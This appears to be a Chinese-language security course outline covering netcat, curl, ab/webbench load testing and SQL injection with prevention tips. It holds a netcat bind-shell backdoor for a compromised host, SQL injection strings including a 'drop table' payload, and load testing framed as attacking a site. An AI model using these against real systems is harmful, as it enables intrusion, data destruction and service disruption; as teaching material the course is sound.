[TOC]
#【课课程介绍】
“矛与盾”互联网中的黑客与红客的斗争，只有知己知彼，才能游刃有余，本次课程咱们站在“黑客”的角度来扫描和测试一个网站的安全性，提出网络安全修改建议，筑起网站服务器的防御盾牌
#【课程知识点】
1. Linux系统常用终端命令
2. 网络入侵利器，瑞士军刀netcat的使用
3. 网站端口扫描，服务器植入后门
4. webbench和ab高并发请求，海量数据攻击
5. 数据库注入与修改

#【课程详情】

## Linux系统常用终端命令

## 网络入侵利器，瑞士军刀netcat的使用
netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它

netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端

### 端口扫描
端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。

```
nc -z -v -n -w 1 server_ip 1-1000
```
### 查看banner
Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。

打印运行在这个端口上服务的banner信息

```
nc -v server_ip 21
```
### 即时通讯
假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。

server
```
nc -l 10000
```

clent
```
nc server_ip 10000
```

### 文件传输

大部分时间中，我们都在试图通过网络或者其他工具传输文件。
有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。
假设，你想要传一个文件file.txt从A到B。

让A作为服务器，B为客户端。

server
```
nc -l 10000 < file.txt
```

client
```
$nc -n server_ip 10000 > file.txt
```

备注：

	'<' : 输入重定向
	'>' : 输出重定向


### 流视频
server
```
cat video.avi | nc -l 10000
```
这里我们只是从一个视频文件中读入并重定向输出到netcat客户端

client
```
nc server_ip 10000 | mplayer -vo x11 -cache 3000 -
```

这里我们从socket中读入数据并重定向到mplayer。

备注：
	sudo apt-get install smyplayer

### 指定源端口
假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。
server
```
nc -l 10000
```
client
```
nc server_ip 10000 -p 25
```
使用1024以内的端口需要root权限。
该命令将在客户端开启25端口用于通讯，否则将使用随机端口。

### 指定源地址
假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。

server
```
nc -u -l 10000 < file.txt
```
client
```
nc -u server_ip 10000 -s client_ip > file.txt
```
该命令将绑定地址172.31.100.5。
这仅仅是使用netcat的一些示例。

### telnet客户端

```
nc -t server_ip
```

### 服务器后门
常见的netcat有两种版本，GNU和OPENBSD版本，ubuntu14.04自带的时OPENBSD版本的。不支持-e参数。

请下载安装GNU版本
```
http://netcat.sourceforge.net/
```
编译安装

	./configure
	make
	sudo make install

因为ubuntu已安装netcat，所以出现了重名,查看是否安装成功

	/usr/local/bin/netcat -h


server(肉鸡)
```
/usr/local/bin/netcat -l  -p 10000 -e /bin/bash
```

client(攻击者)
```
/usr/local/bin/netcat server_ip 10000
```

至于怎么在肉鸡上安装netcat，我就不深入探讨了(PS:有点不道德)

### 参数说明

可以运行在TCP或者UDP模式，默认是TCP

	-u 参数调整为udp.
	-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换
	-v 参数指使用冗余选项,即详细输出
	-n 参数告诉netcat 不要使用DNS反向查询IP地址的域名
	-s 指定本地选用ip地址
	-i 延迟秒数,设置时间间隔，以便传送信息及扫描通信端口
	-l 使用监听模式，监控传入的资料
	-p 设置本地主机使用的通信端口
	-w 超时秒数,设置等待连线的时间


## curl工具

### 基本用法
```
curl http://www.sina.com.cn
```
### 获取响应头部信息
```
curl -I http://www.sina.com.cn
```
### 下载保存
```
curl http://www.c.itcast.cn > itcast.html
curl -o index.html http://www.itcast.cn
curl -O http://www.itcast.cn/files/image/201412/20141231101944337.jpg
```
备注：

	-o:指定保存文件名
	-O:保留源文件名

### 模拟提交表单

```
curl -d "qcount=2&qprice=30&userid=1&qgoods=abc" http://127.0.0.1:8000/fruit/goods_submit/
```

### 设置参照页字符串

参照页是位于HTTP头部中的一个字符串，用来表示用户是从哪个页面到达当前页面的，如果用户点击网页A中的某个连接，那么用户就会跳转到B网页，网页B头部的参照页字符串就包含网页A的URL。 

使用--referer选项指定参照页字符串： 

```
curl --referer http://www.itcast.cn http://c.itcast.cn/?sub
```

来自: http://man.linuxde.net/curl


## ab压力测试

### ubuntu14.04安装ab
```
sudo apt-get install apache2-utils
```

### 测试
```
ab -n 1000 -c 100 -l http://www.qiushibaike.com/
```

### 参数说明

```
ab --help
```

常用说明：
	-n	在测试会话中所执行的总请求次数。
	-c	并非请求客户端数。
	-l  	接受返回数据长度可变

### ab性能指标

1. 吞吐率（Requests per second）

服务器并发处理能力的量化描述，单位是reqs/s，指的是在某个并发用户数下单位时间内处理的请求数。某个并发用户数下单位时间内能处理的最大请求数，称之为最大吞吐率。
记住：吞吐率是基于并发用户数的。这句话代表了两个含义：

	a、吞吐率和并发用户数相关
	b、不同的并发用户数下，吞吐率一般是不同的

计算公式：总请求数/处理完成这些请求数所花费的时间，即

	Request per second=Complete requests/Time taken for tests

必须要说明的是，这个数值表示当前机器的整体性能，值越大越好。

2. 并发连接数（The number of concurrent connections）

并发连接数指的是某个时刻服务器所接受的请求数目，简单的讲，就是一个会话。

3. 并发用户数（Concurrency Level）

同时请求用户数

4、用户平均请求等待时间（Time per request）

计算公式：处理完成所有请求数所花费的时间/（总请求数/并发用户数），即：

	Time per request=Time taken for tests/（Complete requests/Concurrency Level）

5、服务器平均请求等待时间（Time per request:across all concurrent requests）

计算公式：处理完成所有请求数所花费的时间/总请求数，即：

	Time taken for/testsComplete requests

## webbench
### webbench安装
```
wget http://blog.zyan.cc/soft/linux/webbench/webbench-1.5.tar.gz
tar zxvf webbench-1.5.tar.gz
cd webbench-1.5
make
```
### webbench压力测试
```
webbench -c 500 -t 30 URL/
```

参数说明：

	-c表示并发数
	-t表示时间(秒)

## 数据库注入与修改

### SQL注入

所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

例如：
有一个Login画面，在这个Login画面上有两个文本框分别用来输入用户名和密码，当用户点了登录按钮的时候，会对输入的用户名和密码进行验证。验证的SQL语句如下：
       
```
select * from student where username='输入的用户名' and password='输入的密码'  
```
如果能够检索到数据，说明验证通过，否则验证不通过。
 
如果用户在用户名文本框中输入 ' or '1' = '1' or '1' = '1，则验证的SQL语句变成：

```
select * from student where username='' or '1' = '1' or '1' = '1' and password=''  
```
 
如果用户在密码文本框中输入 1' or '1' = '1，则验证的SQL语句变成：

```
select * from student where username='' and password='1' or '1'='1'  
```
 
以上两个SQL语句的where条件永远是成立的，所以验证永远是有效的。
 
如果在用户名文本框中输入  tom' ; drop table student-- ，则SQL语句变成：

```
select * from student where username='tom' ; drop table student--' and password=''  
```
这样就变成的两条SQL语句，执行完查询操作，接着直接把student表给删除了（双连接符表示注释）

### 防止SQL注入

1. 永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双"-"进行转换等。
2. 永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取
3. 不要用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接
4. 不要把机密信息直接存放，加密或者hash掉密码和敏感的信息
5. 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装
6. 采用一些工具或网络平台检测是否存在SQL注入
